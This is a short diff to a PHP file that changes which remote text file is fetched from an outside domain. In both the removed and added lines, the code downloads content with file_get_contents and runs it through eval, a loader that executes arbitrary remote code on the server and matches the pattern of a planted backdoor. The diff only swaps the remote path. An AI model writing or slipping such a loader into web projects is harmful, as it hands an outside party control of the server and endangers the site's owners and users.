@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/review.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/isima.txt'));
 $url = "?> ".$url;
 eval($url);
 
